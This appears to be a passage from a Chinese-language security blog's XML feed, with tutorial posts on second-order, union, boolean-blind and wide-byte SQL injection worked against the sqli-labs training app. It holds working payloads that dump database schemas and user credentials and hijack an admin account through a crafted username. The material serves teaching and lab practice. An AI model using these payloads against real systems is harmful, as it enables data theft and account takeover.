    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><hr><p>二次注入是指<u><strong>已存储（数据库、文件）</strong></u>​<u>的用户</u>​<u><strong>输入被读取</strong></u>​<u>后再次进入到 </u>​<u><strong>SQL 查询</strong></u>​<u>语句中导致的注入</u>。二次注入是sql注入的一种，但是比普通<code>sql注入</code>​利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是<u><strong>输入数据经处理后存储</strong></u>​<u>，取出后，再次进入到 SQL 查询。</u></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><hr><p>在第一次进行数据插入数据库得时候，仅仅知识使用了<code>addslashes()</code>​或者是借助<code>get_magic_quotes_gpc()</code>​对其中得字符进行了转义，在后端代码中可能会被转义，但在存入数据库时候还是原来得数据，数据中一般带有单引号和#号，然后下次使用在拼凑SQL中，所以就行了二次注入。</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><hr><ol><li>插入1‘#</li><li>转义成1\’#</li><li>不能注入，但是保存在数据库时变成了原来的1’#</li><li>利用1’#进行注入,这里利用时要求取出数据时不转义</li></ol><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><hr><ol><li>用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</li><li>数据库对自己存储得数据非常放心，直接读取出恶意数据给用户</li></ol><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><hr><ol><li>注册用户名admin’– -(后面的-是为了突出前面的空格，起到了注释作用)</li></ol><p><img src="/.com//image-20250519103414-6zcaw3y.png" alt="image"></p><ol start="2"><li>使用刚刚注册得账号进行登录。</li></ol><p><img src="/.com//image-20250519103420-s73mbz9.png" alt="image"></p><p>3、查看注册源代码查看注册源代码</p><p><img src="/.com//image-20250519103431-9996xhm.png" alt="image"></p><p>发现用户在注册的时候没有进行特殊符号过滤，所以再一次说明我们注册的用户成功！</p><ol start="4"><li>进行修改密码（攻击）</li></ol><p><img src="/.com//image-20250519103453-0kn30rw.png" alt="image"></p><ol start="5"><li>攻击成功 ，返回使用更新后的密码登录账号 admin。</li></ol><p><img src="/.com//image-20250519103500-foxcdsq.png" alt="image"></p><p>6.登录成功</p><p><img src="/.com//image-20250519103514-e9du0uj.png" alt="image"></p><p>修改密码的时候，语句就会变为：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;aaaaaa&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> -- w<span class="hljs-string">&#x27; and password=&#x27;</span>$curr_pass<span class="hljs-string">&#x27; &quot;;</span><br></code></pre></td></tr></table></figure><p>​<code>-- w</code>​把后面的都给注释了，所以就是修改了admin用户的密码为 aaaaaa</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二次注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>union 注入</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="union-注入"><a href="#union-注入" class="headerlink" title="union 注入"></a>union 注入</h1><h3 id="一、原理及手工注入"><a href="#一、原理及手工注入" class="headerlink" title="一、原理及手工注入"></a>一、原理及手工注入</h3><hr><p>三个条件：</p><ol><li>两个表的<code>列数相同</code>​，并且相应的列具有<code>相似的数据类型</code>​。</li><li>查询结果<code>回显</code>​。</li><li>存在注入漏洞。</li></ol><p>我们可以通过<code>order by</code>​来判断当前表的列数。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.209.128:88</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;  order by <span class="hljs-number">4</span>-- qwq<br></code></pre></td></tr></table></figure><p>4 时错误，3 时正确，可得知，当前表有 3 列</p><p><img src="/.com//image-20250519090453-q9nevqk.png" alt="image"></p><p><img src="/.com//image-20250519090456-ziat5np.png" alt="image"></p><p>通过union union查询来知道显示的列数。</p><p>​<code>http://192.168.209.128:88/Less-1/?id=-1&#39; union select 1 ,2 ,3 -- qwq</code>​</p><p><img src="/.com//image-20250519091423-lg6slw8.png" alt="image"></p><p>我们union查询的就显示出来了。可知，第 2 列和第 3 列是回显列。那我们就可以在这两个位置插入一些函数了。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>:查询数据库的版本<br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>:查询数据库的使用者<br><span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>:数据库<br><span class="hljs-function"><span class="hljs-title">system_user</span><span class="hljs-params">()</span></span>:系统用户名<br><span class="hljs-function"><span class="hljs-title">session_user</span><span class="hljs-params">()</span></span>:连接数据库的用户名<br>current_user:当前用户名<br>load_file:读取本地文件<br>@@datadir:读取数据库路径<br>@@basedir:mysql安装路径<br>@@version_complie_os:查看操作系统<br></code></pre></td></tr></table></figure><p>开始注入脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">//回显出数据库版本信息、数据库所在路径<br>http://192.168.209.128:88/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,version(),@@datadir -- qwq</span><br><span class="hljs-string">//更多自行尝试</span><br><span class="hljs-string">。。。。。。</span><br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250519091530-mom8i84.png" alt="image"></p><p>我们还可以通过 union 注入获得更多的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 获得所有的数据库<br>http://127.0.0.1/sqli/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 获得所有的表</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-1/?id=-1&#x27;</span> union <span class="hljs-keyword">select</span> 1,group_concat(table_name),3 from information_schema.tables--+<br><br>// 获得所有的列<br>http://127.0.0.1/sqli/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns --+</span><br></code></pre></td></tr></table></figure><p>通过select 1,database(),3…，得出当前数据库名security，我们就可以通过下面的语句得到当前数据库的所有的表。</p><p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; -- +</code>​</p><p><img src="/.com//image-20250519091738-nbcnr9w.png" alt="image"></p><p>我们知道了当前数据库中存在了四个表，那么我们可以通过下面的语句知道每个表中的列。</p><p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; -- +</code>​</p><p>如下，我们可以知道 users 表中有 id，username，password 三列</p><p><img src="/.com//image-20250519091812-sx9wpg1.png" alt="image"></p><p>使用 group_concat()拼接账号密码还有 id，即可爆出所有数据</p><p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(id,&#39;--&#39;,username,&#39;--&#39;,password),3 from users -- +</code>​</p><p><img src="/.com//image-20250519091835-7te350s.png" alt="image"></p><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>union 注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>布尔盲注</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h3 id="1-原理以及手工注入"><a href="#1-原理以及手工注入" class="headerlink" title="1. 原理以及手工注入"></a>1. 原理以及手工注入</h3><hr><p>条件：<code>攻击者无法直接获取到这些信息</code>​Web 的页面的仅仅会返回<code>True</code>​和<code>False</code>​。那么布尔盲注就是进行 SQL 注入之后然后根据页面返回的 True 或者是 False 来得到数据库中的相关信息。这里介绍的是通过 <strong>ascii 码</strong>进行盲注的案例。</p><p>盲注一般用到的一些函数：<code>ascii()</code>​、<code>substr()</code>​、<code>length()</code>​，<code>exists()</code>​、<code>concat()</code>​等</p><p>​<code>http://192.168.1.132:86/Less-5/?id=1</code>​为正确页面，回显如下图：</p><p><img src="/.com//image-20250519082946-eco1m1e.png" alt="image"></p><p>​<code>http://192.168.209.128:88/Less-5/?id=1&#39;</code>​为<strong>错误页面</strong>，发现注入点，回显如下图：</p><p><img src="/.com//image-20250519082954-uibof39.png" alt="image"></p><p>​<code>http://192.168.209.128:88/Less-5/?id=1&#39; and length(database())&gt;5 -- qwe</code>​注：这里 qwe 前需要使用<strong>空格</strong>使用 bool 值进行注入比如：and 1&#x3D;1</p><p><img src="/.com//image-20250519083039-xztdkyj.png" alt="image"></p><h4 id="1-如何判断数据库类型？"><a href="#1-如何判断数据库类型？" class="headerlink" title="1.如何判断数据库类型？"></a>1.如何判断数据库类型？</h4><hr><p>这个例子中出错页面已经告诉了我们<strong>此数据库是 MySQL</strong>，那么当我们不知道是啥数据库的时候，如何分辨是哪个数据库呢？目前主流的数据库都有自己的<strong>特有表</strong>分别如下：</p><table><thead><tr><th>数据库</th><th>表名</th></tr></thead><tbody><tr><td>MySQL</td><td>information_schema.tables</td></tr><tr><td>Access</td><td>msysobjects</td></tr><tr><td>SQLServer</td><td>sysobjects</td></tr></tbody></table><p>通过这些特有表，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">//判断是否是Mysql数据库<br>http://192.168.209.128:88/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and exists(select * from information_schema.tables)  #</span><br><span class="hljs-string"></span><br><span class="hljs-string">//判断是否是 access数据库</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and exists(<span class="hljs-keyword">select</span> * from msysobjects) <span class="hljs-comment">#</span><br><br>//判断是否是 Sqlserver数据库<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and exists(select * from sysobjects) #&#x27;</span><br><br>//对于MySQL数据库，information_schema 数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。<br></code></pre></td></tr></table></figure><p>​<code>information_schema.tables</code>​存储了数据表的元数据信息，下面对常用的字段进行介绍：</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>table_schema</td><td>记录数据库名</td></tr><tr><td>table_name</td><td>记录数据表名</td></tr><tr><td>table_rows</td><td>关于表的粗略行估计</td></tr><tr><td>data_length</td><td>记录表的大小（单位字节）</td></tr></tbody></table><h4 id="2-判断当前数据库名-以下方法不适用于-access-和-SQL-Server-数据库"><a href="#2-判断当前数据库名-以下方法不适用于-access-和-SQL-Server-数据库" class="headerlink" title="2. 判断当前数据库名(以下方法不适用于 access 和 SQL Server 数据库)"></a>2. 判断当前数据库名(以下方法不适用于 access 和 SQL Server 数据库)</h4><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">1：判断当前数据库的长度，利用二分法<br>http://192.168.209.128:88/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and length(database())&gt;5 --+ //正常显示</span><br><span class="hljs-string">http://192.168.209.128:88/sqli/Less-5/?id=1&#x27;</span> and length(database())&gt;10 --+ //不显示任何数据<br>http://192.168.209.128:88/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and length(database())&gt;7 --+ //正常显示</span><br><span class="hljs-string">http://192.168.209.128:88/sqli/Less-5/?id=1&#x27;</span> and length(database())&gt;8 --+ //不显示任何数据<br></code></pre></td></tr></table></figure><p>大于 7 正常显示，大于 8 不显示，说明大于 7 而不大于 8，所以可知当前数据库长度为 8 img img</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断<br><br>//判断数据库的第一个字符<br><br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and ascii(substr(database(),1,1))&gt;100 --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">//判断数据库的第二个字符</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and ascii(substr(database(),2,1))&gt;100 --+<br>...........<br></code></pre></td></tr></table></figure><p>由此可以判断出当前数据库为 security，注意使用<code>ascii码</code>​转换字符的时候需要使用<code>十进制</code>​</p><hr><h4 id="3-判断当前数据库中的表（语句后面添加–-）"><a href="#3-判断当前数据库中的表（语句后面添加–-）" class="headerlink" title="3. 判断当前数据库中的表（语句后面添加–+）"></a>3. 判断当前数据库中的表（语句后面添加–+）</h4><p><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select * from admin) &#x2F;&#x2F;猜测当前数据库中是否存在 admin 表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">1：判断当前数据库中表的个数<br>// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;5 #</span><br><span class="hljs-string"></span><br><span class="hljs-string">2：判断每个表的长度</span><br><span class="hljs-string">//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and length((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))=6<br>//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6</span><br><span class="hljs-string"></span><br><span class="hljs-string">3：判断每个表的每个字符的ascii值</span><br><span class="hljs-string">//判断第一个表的第一个字符的ascii值</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;100 <span class="hljs-comment">#</span><br>//判断第一个表的第二个字符的ascii值<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 #</span><br><span class="hljs-string">.........</span><br></code></pre></td></tr></table></figure><p>由此可判断出存在表 emails、referers、uagents、users ，猜测 users 表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</p><hr><ol start="4"><li><h4 id="判断表中的字段"><a href="#判断表中的字段" class="headerlink" title="判断表中的字段"></a>判断表中的字段</h4></li></ol><p><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select username from admin) &#x2F;&#x2F;如果已经证实了存在 admin 表，那么猜测是否存在 username 字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">1：判断表中字段的个数<br><br>//判断<span class="hljs-built_in">users</span>表中字段个数是否大于5，这里的<span class="hljs-built_in">users</span>表是通过上面的语句爆出来的<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;</span><span class="hljs-built_in">users</span><span class="hljs-string">&#x27;)&gt;5 #</span><br><span class="hljs-string"></span><br><span class="hljs-string">2：判断字段的长度</span><br><span class="hljs-string"></span><br><span class="hljs-string">//判断第一个字段的长度</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))&gt;5<br><br>//判断第二个字段的长度<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;</span><span class="hljs-built_in">users</span><span class="hljs-string">&#x27; limit 1,1))&gt;5</span><br><span class="hljs-string"></span><br><span class="hljs-string">3：判断字段的ascii值</span><br><span class="hljs-string"></span><br><span class="hljs-string">//判断第一个字段的第一个字符的长度</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;100<br><br>//判断第一个字段的第二个字符的长度<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span><span class="hljs-built_in">users</span><span class="hljs-string">&#x27; limit 0,1),2,1))&gt;100</span><br><span class="hljs-string"></span><br><span class="hljs-string">...........</span><br></code></pre></td></tr></table></figure><p>由此可判断出 users 表中存在 id、username、password 字段</p><hr><h4 id="5-判断字段中的数据"><a href="#5-判断字段中的数据" class="headerlink" title="5.判断字段中的数据"></a>5.判断字段中的数据</h4><p>我们知道了 users 中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">1: 判断数据的长度<br><br>// 判断<span class="hljs-built_in">id</span>字段的第一个数据的长度<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and length((select id from users limit 0,1))&gt;5</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 判断id字段的第二个数据的长度</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and length((select id from users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;5<br><br>2：判断数据的ascii值<br><br>// 判断<span class="hljs-built_in">id</span>字段的第一个数据的第一个字符的ascii值<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and ascii(substr((select id from users limit 0,1),1,1))&gt;100</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 判断id字段的第一个数据的第二个字符的ascii值</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and ascii(substr((select id from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))&gt;100<br><br>...........<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>布尔盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>宽字节注入</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节注入是由于<strong>不同编码</strong>中中英文所占字符的的不同所导致的，通常的来说，在GBK编码当中，一个<strong>汉字占用2个字节</strong>。除了UTF-8以外，所有的ANSI编码中文都是<strong>占用俩个字符</strong>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//GBK和其他所有ANSI结果为2<br><span class="hljs-built_in">echo</span> strlen(<span class="hljs-string">&quot;中&quot;</span>) <br><br>//UTF-8<br><span class="hljs-built_in">echo</span> strlen(<span class="hljs-string">&quot;中&quot;</span>) //结果为3<br></code></pre></td></tr></table></figure><p>我们先说一下php中对于sql注入的过滤，这里就不得不提到几个函数了。</p><p>​<code>addslashes()</code>​函数，这个函数在<code>预定义字符</code>​之前添加反斜杠 \ 。 这个函数有一个特点<u>虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。</u>这个函数的功能和<code>魔术引号</code>​完全相同，所以当打开了魔术引号时，不应使用这个函数。可以使用<code>get_magic_quotes_gpc()</code>​来检测是否已经转义。</p><p>​<code>mysql_real_escape_string()</code>​函数，这个函数用来转义sql语句中的特殊符号<code>x00</code>​、<code>\n</code>​、<code>\r</code>​、<code>\</code>​、<code>&#39;</code>​、<code>&quot;</code>​、<code>x1a</code>​。</p><p><strong>注：</strong></p><ol><li><p>​<code>预定义字符</code>​：单引 ‘，双引 “，反斜 \，NULL</p></li><li><p>​<code>魔术引号</code>​：当打开时，所有单引号 ‘、双引号 “ 、反斜杠 \ 和NULL字符都会被自动加上一个反斜线来进行转义，和addslashes()函数的作用完全相同。所以，如果魔术引号打开，就不要使用addslashes()函数。一共有三个魔术引号指令：</p><ol><li>magic_quotes_gpc</li><li>magic_quotes_runtime</li><li>magic_quotes_sybase</li></ol></li></ol><p>实操：此次采用sqli的Less-32</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>正常显示<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">209.128</span>:<span class="hljs-number">88</span><span class="hljs-regexp">/Less-32/</span>?id=<span class="hljs-number">1</span> -- qwq<br></code></pre></td></tr></table></figure><p>开始注入：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>添加引号<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">209.128</span>:<span class="hljs-number">88</span><span class="hljs-regexp">/Less-32/</span>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; -- qwq</span><br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250519100543-zrvavbk.png" alt="image"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//布尔注入<br>http://192.168.209.128:88/Less-32/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and 1=2 -- qwq</span><br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250519100551-mtp6jbq.png" alt="image"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//unionunion注入<br>http://192.168.209.128:88/Less-32/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; union select 1,version(),database() -- qwq</span><br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250519100602-u01p2cc.png" alt="image"></p><p>发现页面回显信息，每次注入都将\进行了转义，这时候就要把<code>\</code>​去掉，</p><p>宽字节注入，这里利用的是MySQL的一个特性。MySQL在使用GBK编码的时候，会认为<code>2</code>​个字符是<code>1</code>​个汉字，前提是前一个字符的ASCII值大于128，才会认为是汉字。所以只要我们输入的数据<code>大于等于 %81</code>​就可以使 ‘ 逃脱出来了。</p><p>开始注入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.1.132:86</span>/Less-<span class="hljs-number">32</span>/?id=<span class="hljs-number">1</span> %df <br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250519100805-3ysuh9x.png" alt="image"></p><p>可以发现%df和 ‘ 组成了一个汉字 把<code>/</code>​号干掉之后就可以用unionunion注入查询数据了。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span 